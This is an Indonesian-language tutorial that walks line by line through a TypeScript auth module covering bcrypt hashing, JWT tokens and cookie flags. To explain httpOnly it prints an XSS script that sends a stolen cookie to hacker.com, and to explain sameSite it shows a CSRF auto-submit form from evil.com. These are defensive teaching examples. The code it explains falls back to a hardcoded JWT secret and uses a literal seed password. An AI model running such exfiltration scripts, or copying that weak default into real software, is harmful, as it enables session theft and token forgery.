# Penjelasan Lengkap File `lib/auth.ts` — Baris Per Baris

File ini adalah **"toolbox" autentikasi**. Berisi alat-alat untuk:
- 🔒 Mengacak & mencocokkan password
- 🎫 Membuat & memverifikasi token (kartu akses digital)
- 🍪 Mengatur cookie di browser

File ini **TIDAK berjalan sendiri**. Dia cuma kumpulan fungsi yang **dipanggil oleh file lain** (login, logout, refresh, middleware, seed).

---

## Kode Lengkap + Penjelasan

### ═══ BARIS 1 ═══

```typescript
import bcrypt from "bcryptjs";
```

**Apa artinya:** Mengambil library `bcryptjs` dari folder `node_modules` dan menyimpannya dalam variabel `bcrypt`.

**Apa itu import?** Seperti kamu mau masak, kamu ambil pisau dari laci. `import` = ambil alat dari laci (`node_modules`).

**Apa itu bcryptjs?** Library untuk mengacak password. Kenapa harus diacak?

```
TANPA bcrypt (BAHAYA ❌):
  Database menyimpan:
    username: admin
    password: fordza2026        ← teks asli!
  
  Kalau hacker berhasil curi database, dia langsung tau password-nya.

DENGAN bcrypt (AMAN ✅):
  Database menyimpan:
    username: admin
    password: $2a$12$xYz...     ← sudah diacak!
  
  Kalau hacker curi database, dia cuma dapat teks acak yang tidak bisa 
  dikembalikan ke teks asli. Password aman.
```

---

### ═══ BARIS 2 ═══

```typescript
import { SignJWT, jwtVerify } from "jose";
```

**Apa artinya:** Mengambil 2 fungsi dari library `jose`:
- `SignJWT` → untuk **membuat** JWT token baru
- `jwtVerify` → untuk **mengecek** apakah token valid

**Kenapa pakai `{ }` (kurung kurawal)?** Karena library `jose` punya banyak fungsi. Kita cuma butuh 2, jadi kita pilih spesifik. Ini disebut **named import**.

```typescript
// Named import (ambil spesifik):
import { SignJWT, jwtVerify } from "jose";

// Default import (ambil semuanya):
import bcrypt from "bcryptjs";
```

**Apa itu JWT?** JSON Web Token — seperti **kartu akses digital** berisi data admin:

```
Bentuk fisik (kalau di-decode):
{
  "id": "cmk123",         ← ID admin di database
  "username": "admin",     ← username admin
  "type": "access",        ← tipe token
  "iat": 1740240000,       ← issued at (kapan dibuat)
  "exp": 1740240900        ← expired (kapan kadaluarsa)
}

Bentuk asli (string panjang):
eyJhbGciOiJIUzI1NiJ9.eyJpZCI6ImNtazEyMyJ9.tAnDaTaNgAn
│                      │                      │
│ Bagian 1: Header     │ Bagian 2: Data       │ Bagian 3: Tanda tangan
│ (algoritma enkripsi) │ (id, username, dll)   │ (bukti dari server kita)
```

---

### ═══ BARIS 3 ═══

```typescript
(baris kosong)
```

Baris kosong untuk **keterbacaan** kode. Tidak ada efek apapun.

---

### ═══ BARIS 4-6 ═══

```typescript
const JWT_SECRET = new TextEncoder().encode(
  process.env.JWT_SECRET || "fordza-secret-key-change-in-production",
);
```

Baris ini lumayan kompleks. Mari pecah satu per satu:

#### `const JWT_SECRET =`

`const` = membuat variabel yang **tidak bisa diubah** setelah dibuat.
`JWT_SECRET` = nama variabelnya.

Ini adalah **kunci rahasia** untuk menandatangani token. 

**Analogi:** Bayangkan kamu punya stempel resmi perusahaan. Stempel ini digunakan untuk menandai semua kartu akses. Tanpa stempel yang sama, orang tidak bisa bikin kartu akses palsu.

#### `process.env.JWT_SECRET`

`process.env` = mengakses **environment variables** (variabel lingkungan).
Environment variables disimpan di file `.env`:

```
# File .env
JWT_SECRET="fordza-jwt-secret-key-2026-change-in-production"
```

`process.env.JWT_SECRET` = ambil nilai `"fordza-jwt-secret-key-2026..."` dari file `.env`.

#### `|| "fordza-secret-key-change-in-production"`

`||` = operator **OR** (atau).

Artinya: "Kalau `process.env.JWT_SECRET` tidak ada (undefined), **pakai ini sebagai cadangan**."

```
Kalau file .env punya JWT_SECRET → pakai yang di .env
Kalau file .env TIDAK punya       → pakai "fordza-secret-key-change-in-production"
```

Ini supaya aplikasi tidak error kalau developer lupa set `.env`.

#### `new TextEncoder().encode(...)`

`TextEncoder` = alat bawaan JavaScript untuk mengubah **teks menjadi bytes**.

```
Input:  "abc"
Output: Uint8Array [97, 98, 99]
        (setiap huruf punya nomor dalam tabel ASCII)
```

**Kenapa perlu diubah ke bytes?** Karena library `jose` membutuhkan kunci dalam format `Uint8Array` (array angka/bytes), bukan string biasa. Ini standar dari library-nya.

---

### ═══ BARIS 8 ═══

```typescript
// --- TOKEN CONFIG ---
```

Ini **komentar**. Dimulai dengan `//`. Tidak dieksekusi, hanya untuk catatan developer. Artinya: "bagian ini berisi konfigurasi token".

---

### ═══ BARIS 9 ═══

```typescript
const ACCESS_TOKEN_EXPIRY = "15m"; // 15 menit
```

`const` = variabel tidak bisa diubah.
`ACCESS_TOKEN_EXPIRY` = nama variabel.
`"15m"` = string "15m" yang artinya **15 minutes** (format dari library `jose`).

Format yang didukung:
```
"15m" = 15 menit
"1h"  = 1 jam
"7d"  = 7 hari
"30s" = 30 detik
```

**Kenapa 15 menit?** Ini standar keamanan. Kalau token dicuri hacker, dia cuma bisa pakai **maksimal 15 menit** sebelum expired.

---

### ═══ BARIS 10 ═══

```typescript
const REFRESH_TOKEN_EXPIRY = "7d"; // 7 hari
```

Sama seperti baris 9, tapi untuk refresh token. `"7d"` = 7 days.

**Kenapa 7 hari?** Supaya admin tidak perlu login ulang setiap 15 menit. Selama refresh token masih berlaku (7 hari), admin bisa minta access token baru tanpa ketik password lagi.

---

### ═══ BARIS 12 ═══

```typescript
const ACCESS_COOKIE_NAME = "access_token";
```

Nama yang dipakai untuk menyimpan cookie di browser. Seperti **label di toples**.

```
Browser menyimpan:
┌──────────────────────────────────────┐
│ Cookies untuk localhost:3000         │
├──────────────┬───────────────────────┤
│ Nama         │ Isi                   │
├──────────────┼───────────────────────┤
│ access_token │ eyJhbGci...           │  ← ini
│ refresh_token│ eyJhbGci...           │
└──────────────┴───────────────────────┘
```

---

### ═══ BARIS 13 ═══

```typescript
const REFRESH_COOKIE_NAME = "refresh_token";
```

Sama, nama cookie untuk refresh token.

**Kenapa pakai `const` untuk nama?** Supaya nama cookie **konsisten** di semua file. Kalau kita tulis manual `"access_token"` di setiap file, ada risiko salah ketik (typo) di salah satu file → bug yang susah dicari.

---

### ═══ BARIS 15 ═══

```typescript
// --- PASSWORD ---
```

Komentar pemisah: bagian selanjutnya tentang password.

---

### ═══ BARIS 16 ═══

```typescript
export async function hashPassword(password: string): Promise<string> {
```

Banyak kata-kata di sini. Mari pecah:

#### `export`

Artinya: fungsi ini **bisa dipakai oleh file lain** dengan `import`.

```typescript
// Di file seed.ts:
import { hashPassword } from "@/lib/auth";
//       ↑ bisa di-import karena ada "export"

// Tanpa export, file lain TIDAK BISA pakai fungsi ini
```

#### `async`

Artinya: fungsi ini mengerjakan sesuatu yang **butuh waktu** (tidak instan). Proses hashing password itu berat — butuh waktu ~250 milidetik. `async` memberitahu JavaScript: "jangan tunggu, kerjakan di background".

#### `function hashPassword`

`function` = ini adalah fungsi.
`hashPassword` = nama fungsinya.

#### `(password: string)`

Parameter (input) yang diterima fungsi:
- `password` = nama parameter
- `: string` = tipe datanya harus **string** (teks)

Contoh pemanggilan:
```typescript
hashPassword("fordza2026")
//            ↑ ini yang masuk ke parameter "password"
```

#### `: Promise<string>`

Ini adalah **return type** — tipe data yang dikembalikan fungsi.

- `Promise` = karena fungsi ini `async`, hasilnya dibungkus dalam Promise
- `<string>` = isi Promise-nya adalah string

**Apa itu Promise?** Bayangkan kamu pesan makanan di restoran. Pelayan kasih kamu **nomor antrian** (= Promise). Nanti kalau makanan sudah jadi, nomor antrian itu bisa ditukar dengan makanan (= string hasil hash).

```typescript
const hasil = await hashPassword("fordza2026");
//            ↑ "await" = tunggu sampai Promise selesai
// hasil = "$2a$12$randomChars..."
```

---

### ═══ BARIS 17 ═══

```typescript
  return await bcrypt.hash(password, 12);
```

#### `return`

Mengembalikan nilai ke pemanggil fungsi.

```typescript
const hasil = await hashPassword("fordza2026");
//    ↑ "hasil" akan berisi apapun yang di-return
```

#### `await`

Tunggu sampai proses selesai. Karena hashing butuh waktu, kita harus tunggu (`await`) sampai selesai baru bisa return hasilnya.

#### `bcrypt.hash(password, 12)`

Panggil fungsi `hash` dari library `bcrypt`.

Parameter:
- `password` = teks yang mau di-hash (contoh: `"fordza2026"`)
- `12` = **salt rounds** = tingkat keacakan/keamanan

**Apa itu salt rounds?**

```
Salt rounds = berapa kali proses pengacakan dilakukan.

Round 1:  "fordza2026" + random_salt → hash_1
Round 2:  hash_1 → hash_2
Round 3:  hash_2 → hash_3
...
Round 12: hash_11 → hash_12 (HASIL AKHIR)

Makin banyak rounds:
- Makin aman (hacker butuh waktu lebih lama untuk crack)
- Tapi makin lambat

Perbandingan:
  Salt 10 → ~100ms   (cepat tapi kurang aman)
  Salt 12 → ~250ms   (standar, seimbang) ← kita pakai ini
  Salt 14 → ~1000ms  (sangat aman tapi lambat)
```

Contoh hasil:
```
Input:  "fordza2026"
Output: "$2a$12$4rK5Xq8NzMcpYlWq.GjH5eR7ZqY1dB9xN2mKjL0wPvC3fT6sA"
         │  │  │                 │
         │  │  │                 └── Hasil hash (unik setiap dipanggil!)
         │  │  └── Salt (garam random yang dicampur)
         │  └── Angka 12 (salt rounds)
         └── Penanda algoritma bcrypt versi 2a
```

> 💡 Meskipun input sama `"fordza2026"`, kalau di-hash 2 kali hasilnya **BERBEDA** karena salt-nya random!

**Kapan dipanggil?** Di `prisma/seed.ts` saat bikin admin pertama:
```typescript
// seed.ts baris ~25
const hashedPassword = await hashPassword("fordza2026");
// hashedPassword = "$2a$12$..." → disimpan ke database
```

---

### ═══ BARIS 18 ═══

```typescript
}
```

Tutup kurung kurawal = akhir dari fungsi `hashPassword`.

---

### ═══ BARIS 20-22 ═══

```typescript
export async function verifyPassword(
  password: string,
  hashedPassword: string,
```

Fungsi baru: `verifyPassword` — untuk **mencocokkan** password saat login.

Menerima 2 parameter:
- `password` = password yang **diketik user** saat login (contoh: `"fordza2026"`)
- `hashedPassword` = hash yang **tersimpan di database** (contoh: `"$2a$12$..."`)

**Kenapa 2 baris untuk parameter?** Supaya mudah dibaca. Sebenarnya bisa 1 baris:
```typescript
// Ini SAMA SAJA:
function verifyPassword(password: string, hashedPassword: string)
```

---

### ═══ BARIS 23 ═══

```typescript
): Promise<boolean> {
```

`)` = tutup kurung parameter.
`: Promise<boolean>` = fungsi ini mengembalikan **boolean** (true atau false).
`{` = mulai isi fungsi.

```
true  = password cocok  → login berhasil ✅
false = password salah  → login gagal ❌
```

---

### ═══ BARIS 24 ═══

```typescript
  return await bcrypt.compare(password, hashedPassword);
```

`bcrypt.compare()` = fungsi dari library bcrypt untuk **mencocokkan** password asli dengan hash-nya.

**Cara kerjanya di dalam:**
```
1. Ambil salt dari hashedPassword
   "$2a$12$4rK5Xq8NzMc..." → salt = "4rK5Xq8NzMc"

2. Hash ulang password yang diketik user dengan salt yang SAMA
   bcrypt.hash("fordza2026", salt) → "$2a$12$4rK5Xq8NzMc...HASIL"

3. Bandingkan HASIL dengan hashedPassword
   Sama     → return true  ✅
   Berbeda  → return false ❌
```

**Kapan dipanggil?** Di `login/route.ts`:
```typescript
// login/route.ts baris ~33
const isValid = await verifyPassword(password, admin.password);
// password = yang diketik user sekarang
// admin.password = hash dari database
if (!isValid) {
  // return error "Password salah!"
}
```

---

### ═══ BARIS 25 ═══

```typescript
}
```

Tutup fungsi `verifyPassword`.

---

### ═══ BARIS 27 ═══

```typescript
// --- JWT: ACCESS TOKEN (pendek, untuk akses API) ---
```

Komentar: bagian selanjutnya tentang access token.

---

### ═══ BARIS 28-31 ═══

```typescript
export async function signAccessToken(payload: {
  id: string;
  username: string;
}): Promise<string> {
```

Fungsi baru: `signAccessToken` — membuat access token.

#### `payload: { id: string; username: string; }`

Parameter `payload` bertipe **objek** yang harus punya property `id` (string) dan `username` (string).

```typescript
// Cara memanggilnya:
signAccessToken({ id: "cmk123", username: "admin" })
//               ↑ ini adalah "payload"
//               harus punya "id" dan "username"

// SALAH (akan error karena tipe tidak cocok):
signAccessToken({ id: 123 })           // ❌ id harus string, bukan number
signAccessToken({ username: "admin" }) // ❌ id tidak ada
signAccessToken("admin")              // ❌ bukan objek
```

**Apa itu payload?** Dalam konteks JWT, payload = **data yang ditaruh di dalam token**. Seperti data yang ditulis di kartu akses.

---

### ═══ BARIS 32 ═══

```typescript
  return await new SignJWT({ ...payload, type: "access" })
```

Baris ini sangat padat. Mari pecah:

#### `new SignJWT(...)`

`new` = membuat **instance baru** (objek baru) dari class `SignJWT`.
`SignJWT` = class dari library `jose` untuk membuat JWT.

#### `{ ...payload, type: "access" }`

`...payload` = **spread operator**. Artinya: "ambil semua isi objek `payload` dan taruh di sini".

```typescript
// payload = { id: "cmk123", username: "admin" }

{ ...payload, type: "access" }
// SAMA DENGAN:
{ id: "cmk123", username: "admin", type: "access" }

// Jadi ...payload itu "membuka" isi objek dan menyebarkan isinya
```

`type: "access"` = menambahkan property `type` dengan nilai `"access"`. Ini penting supaya kita bisa **membedakan** access token dan refresh token nanti.

---

### ═══ BARIS 33 ═══

```typescript
    .setProtectedHeader({ alg: "HS256" })
```

#### `.setProtectedHeader()`

Method ini mengatur **header** JWT — bagian yang berisi info tentang algoritma enkripsi yang dipakai.

#### `{ alg: "HS256" }`

`alg` = algorithm (algoritma).
`"HS256"` = **HMAC-SHA256**. Ini algoritma untuk membuat tanda tangan digital.

**Analogi:** Kalau kamu tanda tangan dokumen, kamu pakai pulpen. Nah `"HS256"` ini seperti "tipe pulpen" yang kamu pakai. Penerima dokumen harus tau kamu pakai pulpen tipe apa supaya bisa memverifikasi.

**Kenapa HS256?** Karena cepat, aman, dan standar industri. Dipakai oleh sebagian besar aplikasi web.

---

### ═══ BARIS 34 ═══

```typescript
    .setIssuedAt()
```

Otomatis menambahkan field `iat` (issued at) ke dalam token dengan waktu sekarang.

```json
{ "iat": 1740240000 }
// iat = angka unix timestamp
// 1740240000 = 22 Feb 2026 19:00:00
```

**Untuk apa?** Supaya kita bisa tau kapan token ini dibuat. Berguna untuk audit/logging.

---

### ═══ BARIS 35 ═══

```typescript
    .setExpirationTime(ACCESS_TOKEN_EXPIRY)
```

Menambahkan field `exp` (expiration) ke dalam token.

`ACCESS_TOKEN_EXPIRY` = `"15m"` (dari baris 9).

```json
{ "exp": 1740240900 }
// 1740240900 = 1740240000 (iat) + 900 detik (15 menit)
```

**Setelah 15 menit**, token ini dianggap **kadaluarsa**. `jwtVerify` akan otomatis menolaknya.

---

### ═══ BARIS 36 ═══

```typescript
    .sign(JWT_SECRET);
```

**Tanda tangani** token dengan kunci rahasia kita.

Ini langkah terakhir yang menghasilkan string JWT final:
```
eyJhbGciOiJIUzI1NiJ9.eyJpZCI6ImNtazEyMyIsInR5cGUiOiJhY2Nlc3MifQ.tAnDaTaNgAn
```

Bagian ketiga (setelah titik kedua) = **signature** (tanda tangan). Ini dibuat dengan rumus:
```
signature = HMAC-SHA256(header + "." + payload, JWT_SECRET)
```

Karena hanya server kita yang punya `JWT_SECRET`, hanya server kita yang bisa membuat signature yang valid. **Token tidak bisa dipalsukan** tanpa kunci ini.

---

### ═══ BARIS 37 ═══

```typescript
}
```

Tutup fungsi `signAccessToken`.

**Kapan dipanggil?**
```typescript
// Di login/route.ts setelah password valid:
const accessToken = await signAccessToken({ id: admin.id, username: admin.username });
// accessToken = "eyJhbGci..." (berlaku 15 menit)

// Di refresh/route.ts saat bikin token baru:
const newAccessToken = await signAccessToken({ id: payload.id, username: payload.username });
```

---

### ═══ BARIS 39-49 ═══

```typescript
// --- JWT: REFRESH TOKEN (panjang, untuk dapat access token baru) ---
export async function signRefreshToken(payload: {
  id: string;
  username: string;
}): Promise<string> {
  return await new SignJWT({ ...payload, type: "refresh" })
    .setProtectedHeader({ alg: "HS256" })
    .setIssuedAt()
    .setExpirationTime(REFRESH_TOKEN_EXPIRY)
    .sign(JWT_SECRET);
}
```

**100% sama** dengan `signAccessToken`. Bedanya HANYA 2 tempat:

```
signAccessToken:                      signRefreshToken:
  type: "access"                        type: "refresh"          ← BEDA 1
  .setExpirationTime("15m")             .setExpirationTime("7d") ← BEDA 2
```

**Kenapa type berbeda?** Supaya middleware bisa bedain:
```
Middleware cek token:
  type = "access"  → ✅ Boleh akses API
  type = "refresh" → ❌ TOLAK! Ini bukan untuk akses API,
                         ini cuma untuk minta access token baru
```

**Kapan dipanggil?** HANYA di `login/route.ts`:
```typescript
const refreshToken = await signRefreshToken({ id: admin.id, username: admin.username });
```

---

### ═══ BARIS 51 ═══

```typescript
// --- VERIFY TOKEN (bisa access atau refresh) ---
```

Komentar: bagian untuk memverifikasi token.

---

### ═══ BARIS 52-54 ═══

```typescript
export async function verifyToken(
  token: string,
): Promise<{ id: string; username: string; type: string } | null> {
```

Fungsi `verifyToken` — mengecek apakah token valid.

#### `: Promise<{ id: string; username: string; type: string } | null>`

Return type yang agak kompleks. Mari baca:

```
Promise<                                    >
         { id: string; username: string; type: string }  ← KALAU VALID
         |                                                ← ATAU
         null                                             ← KALAU TIDAK VALID
```

Jadi fungsi ini bisa return **2 kemungkinan**:
```typescript
// Kalau token valid:
{ id: "cmk123", username: "admin", type: "access" }

// Kalau token tidak valid / expired / palsu:
null
```

`|` ini disebut **union type** di TypeScript — artinya "tipe A ATAU tipe B".

---

### ═══ BARIS 55 ═══

```typescript
  try {
```

`try { ... } catch { ... }` = **error handling**.

Artinya: "Coba jalankan kode di dalam `try`. Kalau ada error, jangan crash — tangkap error-nya di `catch`."

**Kenapa perlu try/catch?** Karena `jwtVerify` akan **throw error** (melempar error) kalau token tidak valid. Tanpa try/catch, seluruh aplikasi akan crash.

---

### ═══ BARIS 56 ═══

```typescript
    const { payload } = await jwtVerify(token, JWT_SECRET);
```

#### `jwtVerify(token, JWT_SECRET)`

Fungsi dari library `jose` yang **memverifikasi** token. Yang dicek:

```
1. Apakah signature (tanda tangan) cocok dengan JWT_SECRET kita?
   → Kalau tidak cocok = token PALSU (dibuat oleh server lain / dimanipulasi)

2. Apakah token belum expired?
   → Ambil field "exp" dari token, bandingkan dengan waktu sekarang
   → Kalau exp < waktu sekarang → token KADALUARSA

3. Apakah format token benar?
   → Harus 3 bagian dipisah titik: header.payload.signature
```

Kalau semua oke → return objek `{ payload, protectedHeader }`
Kalau gagal → **throw error** (ditangkap oleh `catch`)

#### `const { payload } = ...`

Ini disebut **destructuring assignment**. Artinya: "dari objek yang dikembalikan, ambil hanya property `payload`."

```typescript
// jwtVerify mengembalikan:
{
  payload: { id: "cmk123", username: "admin", type: "access", iat: ..., exp: ... },
  protectedHeader: { alg: "HS256" }
}

// Kita cuma butuh payload, jadi:
const { payload } = await jwtVerify(token, JWT_SECRET);
// payload = { id: "cmk123", username: "admin", type: "access" }

// SAMA DENGAN (tapi lebih panjang):
const result = await jwtVerify(token, JWT_SECRET);
const payload = result.payload;
```

---

### ═══ BARIS 57 ═══

```typescript
    return payload as { id: string; username: string; type: string };
```

#### `return payload`

Kembalikan data payload ke pemanggil.

#### `as { id: string; username: string; type: string }`

Ini disebut **type assertion** di TypeScript. Artinya: "saya yakin bahwa `payload` berbentuk seperti ini."

Karena `jwtVerify` mengembalikan `JWTPayload` (tipe generic dari library Jose), kita perlu bilang ke TypeScript: "tenang, saya tau isinya pasti `{ id, username, type }` karena kita yang bikin tokennya sendiri."

**Tanpa `as`:** TypeScript akan komplain karena tipe-nya tidak cocok.

---

### ═══ BARIS 58-59 ═══

```typescript
  } catch {
    return null;
  }
```

`catch` = tangkap error dari `try`.

Kalau `jwtVerify` gagal (token palsu, expired, format salah), kode masuk ke sini dan return `null`.

```typescript
// Pemanggil bisa cek hasilnya:
const data = await verifyToken("eyJhbG...");

if (data === null) {
  // Token tidak valid!
} else {
  // Token valid, data = { id: "cmk123", username: "admin", type: "access" }
}
```

**Kenapa `catch` kosong (tanpa parameter)?** Di TypeScript/JavaScript modern, kalau kita tidak butuh info error-nya (kita sudah tau artinya: token tidak valid), kita bisa tulis `catch` tanpa parameter.

```typescript
// Dua-duanya VALID:
catch (error) { return null; }  // tangkap error tapi tidak dipakai
catch { return null; }          // tidak perlu tau error-nya apa
```

---

### ═══ BARIS 61 ═══

```typescript
}
```

Tutup fungsi `verifyToken`.

**Kapan dipanggil?**
```typescript
// Di me/route.ts — cek siapa admin yang login:
const data = await verifyToken(token);
// data = { id: "cmk123", username: "admin", type: "access" }

// Di refresh/route.ts — cek refresh token sebelum bikin access token baru:
const data = await verifyToken(refreshToken);
if (data?.type !== "refresh") {
  // TOLAK — ini bukan refresh token!
}
```

---

### ═══ BARIS 63-65 ═══

```typescript
// --- COOKIE CONFIGS ---

// Access Token Cookie (15 menit)
```

Komentar pemisah.

---

### ═══ BARIS 66 ═══

```typescript
export function getAccessCookieConfig(token: string) {
```

Fungsi baru. **Tidak `async`** karena tidak ada proses berat — hanya membuat objek biasa.

Fungsi ini **TIDAK menyimpan cookie**. Dia hanya mengembalikan **setting** (konfigurasi) yang nanti dipakai route untuk menyimpan.

```
getAccessCookieConfig("eyJhbG...")
        │
        ▼
return { name: ..., value: ..., httpOnly: ..., maxAge: ... }
        │
        ▼ (di login/route.ts)
response.cookies.set( objek_setting_ini )  ← BARU DI SINI cookie disimpan ke browser
```

---

### ═══ BARIS 67 ═══

```typescript
  return {
```

Mulai return sebuah objek `{ ... }`.

---

### ═══ BARIS 68 ═══

```typescript
    name: ACCESS_COOKIE_NAME,
```

`name` = nama cookie di browser. Nilainya `"access_token"` (dari baris 12).

Browser menyimpan cookie berdasarkan nama. Kalau sudah ada cookie dengan nama yang sama, isinya ditimpa.

---

### ═══ BARIS 69 ═══

```typescript
    value: token,
```

`value` = isi cookie. Berisi string JWT token (contoh: `"eyJhbG..."`).

---

### ═══ BARIS 70 ═══

```typescript
    httpOnly: true,
```

⭐ **INI SETTING PALING PENTING UNTUK KEAMANAN!**

`httpOnly: true` artinya: **JavaScript di browser TIDAK BISA membaca cookie ini.**

```
TANPA httpOnly (BAHAYA ❌):
  Hacker inject script ke halaman web kamu (serangan XSS):
  
  <script>
    const token = document.cookie;  // ← BERHASIL baca cookie!
    // Kirim token curian ke server hacker:
    fetch("https://hacker.com/steal?token=" + token);
  </script>
  
  Hacker dapat access token kamu → dia bisa login sebagai admin!

DENGAN httpOnly: true (AMAN ✅):
  Hacker inject script:
  
  <script>
    const token = document.cookie;  // ← GAGAL! return string kosong
    // cookie httpOnly tidak muncul di document.cookie
  </script>
  
  Token AMAN karena hanya server yang bisa baca cookie ini.
  Cookie tetap dikirim otomatis oleh browser ke server,
  tapi JavaScript tidak bisa mengaksesnya.
```

---

### ═══ BARIS 71 ═══

```typescript
    secure: process.env.NODE_ENV === "production",
```

`secure` = apakah cookie hanya boleh dikirim via **HTTPS**.

```
process.env.NODE_ENV = "development" (saat dev)
  → "development" === "production" → FALSE
  → Cookie bisa dikirim via HTTP (http://localhost:3000)
  → Kita butuh ini supaya bisa test di local

process.env.NODE_ENV = "production" (saat di hosting)
  → "production" === "production" → TRUE
  → Cookie HANYA bisa dikirim via HTTPS (https://fordza.com)
  → Proteksi dari man-in-the-middle attack
```

**Apa itu man-in-the-middle?** Hacker "menguping" koneksi internet. Kalau pakai HTTP (tanpa S), data dikirim dalam teks biasa dan bisa dibaca. HTTPS mengenkripsi data sehingga tidak bisa dibaca walau diuping.

---

### ═══ BARIS 72 ═══

```typescript
    sameSite: "lax" as const,
```

Proteksi dari serangan **CSRF (Cross-Site Request Forgery)**.

```
Serangan CSRF:
  Kamu sedang login di fordza.com (cookie tersimpan di browser).
  
  Lalu kamu buka email yang berisi link ke evil.com.
  Di evil.com ada kode tersembunyi:
  
  <form action="https://fordza.com/api/admin/products" method="POST">
    <input name="name" value="PRODUK HACKER">
  </form>
  <script>document.forms[0].submit();</script>
  
  TANPA sameSite:
    → Browser kirim cookie fordza.com ke request dari evil.com
    → Server fordza.com terima request + cookie yang valid
    → Produk hacker berhasil ditambahkan! ❌

  DENGAN sameSite: "lax":
    → Browser TIDAK kirim cookie untuk POST request dari evil.com
    → Server fordza.com: "Tidak ada cookie? TOLAK!"
    → Serangan GAGAL ✅
```

`"lax"` artinya:
- Cookie dikirim saat user **langsung navigasi** ke fordza.com ✅
- Cookie **TIDAK dikirim** saat website lain bikin request ke fordza.com ❌

`as const` = TypeScript assertion. Karena `sameSite` harus bertipe `"lax" | "strict" | "none"` (bukan sembarang string), kita perlu `as const` supaya TypeScript tau bahwa `"lax"` ini **literal** (persis string "lax"), bukan string biasa.

---

### ═══ BARIS 73 ═══

```typescript
    path: "/",
```

Cookie berlaku untuk **semua URL** di website.

```
path: "/"
  ✅ /api/admin/products
  ✅ /api/admin/categories  
  ✅ /api/public/products
  ✅ /halaman-apapun

Kalau path: "/api/admin"
  ✅ /api/admin/products     ← cookie dikirim
  ❌ /api/public/products    ← cookie TIDAK dikirim
  ❌ /dashboard              ← cookie TIDAK dikirim
```

Kita pakai `"/"` supaya cookie tersedia di mana saja.

---

### ═══ BARIS 74 ═══

```typescript
    maxAge: 60 * 15, // 15 menit
```

`maxAge` = umur cookie dalam **detik**.

```
60 detik × 15 = 900 detik = 15 menit

Setelah 15 menit dari saat cookie di-set, browser OTOMATIS menghapus cookie ini.
Admin harus refresh token atau login ulang.
```

---

### ═══ BARIS 75-76 ═══

```typescript
  };
}
```

Tutup objek return dan tutup fungsi.

**Kapan dipanggil?**
```typescript
// Di login/route.ts:
const accessToken = await signAccessToken({ id: admin.id, username: admin.username });
response.cookies.set(getAccessCookieConfig(accessToken));
//                    ↑ return objek setting → disimpan ke browser sebagai cookie

// Di refresh/route.ts:
const newToken = await signAccessToken({ ... });
response.cookies.set(getAccessCookieConfig(newToken));
```

---

### ═══ BARIS 79-89 ═══

```typescript
export function getRefreshCookieConfig(token: string) {
  return {
    name: REFRESH_COOKIE_NAME,                // "refresh_token"
    value: token,                              // isi refresh token JWT
    httpOnly: true,                            // JS tidak bisa baca
    secure: process.env.NODE_ENV === "production",
    sameSite: "lax" as const,
    path: "/",
    maxAge: 60 * 60 * 24 * 7,                 // 7 hari
  };
}
```

**Sama persis** dengan `getAccessCookieConfig` di atas. Yang beda:

```
getAccessCookieConfig:             getRefreshCookieConfig:
  name: "access_token"               name: "refresh_token"    ← BEDA
  maxAge: 60 * 15 (15 menit)         maxAge: 60*60*24*7       ← BEDA
                                      = 604800 detik
                                      = 7 hari
```

**Kalkulasi maxAge:**
```
60    detik/menit
× 60  menit/jam
× 24  jam/hari
× 7   hari
= 604800 detik = 7 hari
```

---

### ═══ BARIS 92 ═══

```typescript
export function getLogoutCookieConfigs() {
```

Fungsi untuk **menghapus semua cookie** saat logout. **Tidak menerima parameter** karena kita tidak perlu nilai token untuk menghapus.

---

### ═══ BARIS 93-99 ═══

```typescript
  const base = {
    httpOnly: true,
    secure: process.env.NODE_ENV === "production",
    sameSite: "lax" as const,
    path: "/",
    maxAge: 0,
  };
```

`const base` = objek setting **dasar** yang dipakai bersama oleh kedua cookie.

#### `maxAge: 0` ⭐

Ini kunci logout. `maxAge: 0` artinya: "cookie ini sudah expired **SEKARANG JUGA**."

Saat browser menerima cookie dengan `maxAge: 0`, browser langsung **menghapus** cookie tersebut dari penyimpanan.

---

### ═══ BARIS 100-103 ═══

```typescript
  return [
    { name: ACCESS_COOKIE_NAME, value: "", ...base },
    { name: REFRESH_COOKIE_NAME, value: "", ...base },
  ];
```

Return **array** berisi 2 objek setting cookie.

#### `[ ... , ... ]`

`[ ]` = array (daftar). Array ini berisi 2 item.

#### `{ name: ACCESS_COOKIE_NAME, value: "", ...base }`

```typescript
// ...base = spread operator, memasukkan semua isi objek "base"
// Jadi objek ini menjadi:
{
  name: "access_token",     // ← nama cookie yang mau dihapus
  value: "",                // ← isi dikosongkan
  httpOnly: true,           // ← dari ...base
  secure: true/false,       // ← dari ...base
  sameSite: "lax",          // ← dari ...base
  path: "/",                // ← dari ...base
  maxAge: 0                 // ← dari ...base → HAPUS SEKARANG
}
```

#### `value: ""`

Isi cookie dikosongkan. Walaupun `maxAge: 0` sudah cukup untuk menghapus, kita juga kosongkan isinya untuk **jaga-jaga**.

**Kapan dipanggil?**
```typescript
// Di logout/route.ts:
const cookieConfigs = getLogoutCookieConfigs();
// cookieConfigs = [ {hapus access}, {hapus refresh} ]

for (const config of cookieConfigs) {
  response.cookies.set(config);
  // Loop 1: set cookie "access_token" dengan maxAge=0 → browser HAPUS
  // Loop 2: set cookie "refresh_token" dengan maxAge=0 → browser HAPUS
}
```

---

### ═══ BARIS 104 ═══

```typescript
}
```

Tutup fungsi `getLogoutCookieConfigs`.

---

### ═══ BARIS 106 ═══

```typescript
export { ACCESS_COOKIE_NAME, REFRESH_COOKIE_NAME };
```

**Export** kedua konstanta nama cookie supaya file lain bisa import.

```typescript
// Di middleware.ts:
import { ACCESS_COOKIE_NAME } from "@/lib/auth";
// Sekarang middleware bisa pakai: request.cookies.get(ACCESS_COOKIE_NAME)

// Di me/route.ts:
import { ACCESS_COOKIE_NAME } from "@/lib/auth";
const token = request.cookies.get(ACCESS_COOKIE_NAME)?.value;
```

**Kenapa di-export?** Supaya semua file pakai nama cookie yang **SAMA**. Ini disebut **Single Source of Truth** = satu sumber kebenaran.

```
TANPA export (RAWAN BUG ❌):
  auth.ts:        "access_token"
  middleware.ts:  "acces_token"     ← TYPO! kurang 1 huruf "s"
  me/route.ts:    "access_token"
  
  Middleware tidak pernah menemukan cookie karena nama salah!
  Bug ini SANGAT SUSAH dicari.

DENGAN export (AMAN ✅):
  auth.ts:        ACCESS_COOKIE_NAME = "access_token"  ← didefinisikan di sini
  middleware.ts:  import { ACCESS_COOKIE_NAME }         ← ambil dari auth.ts
  me/route.ts:    import { ACCESS_COOKIE_NAME }         ← ambil dari auth.ts
  
  Semua file pasti pakai nama yang sama.
  Kalau mau ganti, cukup ubah di auth.ts saja.
```

---

